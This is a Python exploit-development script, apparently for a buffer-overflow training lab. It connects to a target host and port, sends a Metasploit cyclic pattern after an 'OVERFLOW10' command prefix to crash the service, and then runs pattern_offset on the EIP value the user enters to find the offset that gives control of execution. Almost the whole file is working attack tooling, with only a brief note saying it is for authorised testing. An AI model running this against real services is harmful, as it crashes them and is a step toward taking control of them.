#!/usr/bin/env python3

import sys
import subprocess
import socket
import argparse
import itertools
from typing import Optional

def is_valid_memory_address(address: str) -> bool:
    try:
        int(address, 16)
        return len(address) == 8
    except ValueError:
        return False

def main(ip: str, port: int, overflow_threshold: int) -> None:
	# Pattern Create and Pattern Offset
	pattern_create = '/usr/share/metasploit-framework/tools/exploit/pattern_create.rb'  # CHANGE IF NECESSARY
	pattern_offset = '/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb'  # CHANGE IF NECESSARY

	# Define prefix and buffer with encoded cyclic pattern
	prefix = b"OVERFLOW10 "	# CHANGE
	# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <size>
	cyclic_pattern = subprocess.check_output([pattern_create, '-l', overflow_threshold])
	buffer = cyclic_pattern.decode('utf-8').rstrip('\n').encode('utf-8')
	payload = b""

	timeout = 5
	try:
		# Create socket object
		with socket.socket() as s:
			# Connect to target server
			s.connect((ip, port))

			# Set Timeout
			s.settimeout(timeout)

			# Print server banner
			try:
				while True:
					response = s.recv(4096)
					print(f"{response.decode()}")
			except:
				pass

			# Send data to the server
			payload = b"".join(
				[
					prefix,
					buffer
				]
			)
			print(f"Sending payload...")
			s.send(payload)

			response = s.recv(4096)
			# Print the response from the server
			print(f"Response: {response.decode()}")

	except ConnectionError:
		print('Connection Refused')
		sys.exit(0)
	except:
		print("\n","="*25,"CRASH","="*25,"\n")
		print(f"Application crashed at {len(payload) - len(prefix)} bytes!")
		while True:
			eip = input("What is the value of the EIP? (ex:FFFFFFFF)\n> ")
			if is_valid_memory_address(eip):
				# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -1 <value>
				offset = subprocess.check_output([pattern_offset, '-q', eip])
				print(offset.decode('utf-8'))
				break
			else:
				print("Invalid input, please enter a valid memory address.")
		sys.exit(0)

if __name__ == "__main__":
	# Parse command line arguments
	parser = argparse.ArgumentParser(
		prog="EIP Offset",
		description="""This is a Python script for controlling the eip of a process in a remote server by filling the target application's buffer with a cyclic pattern. 
	The script takes three arguments: an IP address, a port number, and an overflow threshold. It takes advantage of the metasploit framework exploit /patter_create.rb and /pattern_offset.rb.
	It is intended for use in a controlled testing environment and should not be used to target production systems or networks without proper authorization.
	NOTE: Edit the script with the metasploit exploit location in your environment if you are getting an error.""",
		epilog="Have fun experimenting with this tool!"
	)
	parser.add_argument("ip", help="IP address of the target")
	parser.add_argument("port", type=int, help="Port number of the target")
	parser.add_argument("overflow_threshold", help="Payload size which is able to crash the target application")
	args = parser.parse_args()

	# Call main function
	main(args.ip, args.port, args.overflow_threshold)